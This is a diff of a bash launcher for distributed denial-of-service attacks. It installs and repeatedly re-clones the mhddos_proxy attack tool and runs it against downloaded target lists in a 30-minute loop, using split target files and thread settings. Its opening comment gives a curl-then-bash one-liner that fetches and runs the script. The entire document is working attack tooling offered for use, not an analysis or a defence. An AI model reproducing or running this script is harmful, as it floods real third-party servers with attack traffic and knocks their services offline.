@@ -1,11 +1,16 @@
 #!/bin/bash
-# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/multiddos.sh && bash multiddos.sh
-clear && echo -e "Loading... v0.9a\n"
+# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
+clear && echo -e "Loading... test v0.9.1\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
-sudo apt-get install -q -y tmux git toilet python3 python3-pip 
+sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd #delete old folder; create new and cd inside
-sudo rm -f /var/tmp/*uaripper #remove previous targets under root
+rm -rf ~/multidd ~/multiddos #just in case also delete relic folder
+pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
+
+# create swap file if system doesn't have it
+if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
+    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
+fi
 
 typing_on_screen (){
     tput setaf 2 &>/dev/null # green
@@ -110,7 +115,7 @@ while [ "$1" != "" ]; do
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
         --lite ) export lite="on"; shift ;;
-        --plite ) export lite="on"; export proxy_finder="on"; export proxy_threads=1000; shift ;;
+        --plite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;;
     esac
@@ -120,31 +125,25 @@ prepare_targets_and_banner
 
 # create small separate script to re-launch only this small part of code
 cat > auto_bash.sh << 'EOF'
-# create swap file if system doesn't have it
-if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
-    sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
-fi
-
-#install mhddos and mhddos_proxy
-cd ~/multidd/
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-cd mhddos_proxy
-python3 -m pip install -r requirements.txt
-git clone https://github.com/MHProDev/MHDDoS.git
-
-# Restart and update targets every 30 minutes
+# Restart and update everything (mhddos_proxy and targets) every 30 minutes
 while true; do
-    pkill -f start.py; pkill -f runner.py
+    #install mhddos_proxy
+    rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd
+    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+    cd mhddos_proxy
+    python3 -m pip install -r requirements.txt
+
     if [[ $lite == "on" ]]; then
         tail -n 2000 $targets_uniq > $targets_lite
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods -t 5000 $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
     else
         cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $threads $args_to_pass &
-        sleep 15 # to decrease load on cpu during simultaneous start
+        sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
+pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
 done
 EOF
